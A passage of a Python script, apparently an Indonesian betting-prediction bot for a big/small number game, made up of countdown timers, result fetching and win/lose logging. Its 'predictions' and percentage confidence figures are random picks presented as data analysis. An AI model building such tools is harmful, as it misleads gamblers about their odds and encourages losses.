        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX8B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB5/9 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX8K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX9B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB7/8 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX9K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK0/1 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX10B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX10K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK1/2 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX11B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB6/9 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX11K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX12B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB5/7 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX12K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK0/4 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX13B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX13K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{WW1}  {L}{G}┃  {G}22 {G}┃    {PT}{secs:02d}   {GRY} ┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX14B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX14K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def gameissue ():
			
    data = {
    'typeid' : '1',
    'language' : '1'
    }
    a = response_GetGameIssue()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('issueNumber')
    with open('issuenumber.txt', 'w') as f:
        f.write(str(d))
        f.close()

			 		 
def halaman1 ():
    #   data = {
    #   'typeid' : '1',
    #   'pageno' : '1',
    #   'language' : 'id'
    #   }
    #   session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e2 = d[0].get('number')
      e6 = d[0].get('issueNumber')
      e10 = d[0].get('number')
      with open("halaman1.txt", 'w') as f:
       f.write(str(e2))
       f.close()
       
def losess ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    sin()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '5':
        print(f"{G}┃            analisis new data.. complete^                {L}{G}┃")
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi2()
    elif f > '4':
        print(f"{G}┃            analisis new data.. complete^                {L}{G}┃")
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi2()
       
def auto_skip ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    skip()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f == '0':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} SKIPP {L} {N}{ BO}{GR}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {GR}  SKIP  {L} {G}┃   ⚠️⚠️   ┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f == '1':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} SKIPP {L} {N}{ BO}{GR}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {GR}  SKIP  {L} {G}┃   ⚠️⚠️   ┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f == '2':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} SKIPP {L} {N}{ BO}{GR}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {GR}  SKIP  {L} {G}┃   ⚠️⚠️   ┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f == '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} SKIPP {L} {N}{ BO}{GR}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {GR}  SKIP  {L} {G}┃   ⚠️⚠️   ┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f == '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} SKIPP {L} {N}{ BO}{GR}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {GR}  SKIP  {L} {G}┃   ⚠️⚠️   ┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f == '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} SKIPP {L} {N}{ BO}{GR}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {GR}  SKIP  {L} {G}┃   ⚠️⚠️   ┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f == '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} SKIPP {L} {N}{ BO}{GR}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {GR}  SKIP  {L} {G}┃   ⚠️⚠️   ┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f == '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} SKIPP {L} {N}{ BO}{GR}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {GR}  SKIP  {L} {G}┃   ⚠️⚠️   ┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} SKIPP {L} {N}{ BO}{GR}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {GR}  SKIP  {L} {G}┃   ⚠️⚠️   ┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    
def auto_besarX1e ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = [' •READ• ',' •READ• ']
			cs = ['rumusX1()','rumusX2()','rumusX4()','rumusX5()','rumusX6()','rumusX7()','rumusX8()','rumusX9()','rumusX10()']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			sc =h.choice(cs)
			print(f'{G}•{taruhanbesarX1e()}')


def auto_kecilX1e ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			cs = ['rumusX1()','rumusX2','rumusX4','rumusX5','rumusX6','rumusX7','rumusX8','rumusX9','rumusX10']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			sc =h.choice(cs)
			print(f'{G}{taruhankecilX1e()}')
			
def taruhankecilX1eee ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX1Ke()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '0' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            losess()
			 
def taruhanbesarX1eee ():
    data = {
        'typeid' : '1',
        'pageno' : '1',
        'language' : 'id'
    }
    gameissue()
    countdownTimerX1Be()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()

    response = response_GetNoaverageEmerdList()
    b = json.loads(response.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
        ee = open("Num.txt", 'r')
        f = ee.read()
    if f > '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/6 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '5' and f < '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/6 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/6 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{CY}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/6 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            losess()
    
def auto_besarX2eee ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = [' •READ• ',' •READ• ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}•{taruhanbesarX2eee()}')


def auto_kecilX2eee ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}{taruhankecilX2eee()}')
			
def taruhankecilX2eee ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX2Ke()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
